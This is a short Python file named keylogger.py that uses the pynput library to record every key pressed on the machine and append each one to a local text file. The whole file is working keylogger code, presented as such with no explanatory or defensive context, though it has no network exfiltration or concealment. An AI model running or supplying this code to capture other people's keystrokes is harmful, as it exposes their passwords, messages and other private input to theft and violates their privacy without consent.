# keylogger.py
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("keylogs.txt", "a") as log_file:
        log_file.write(f'{key}\n')

with Listener(on_press=on_press) as listener:
    listener.join()
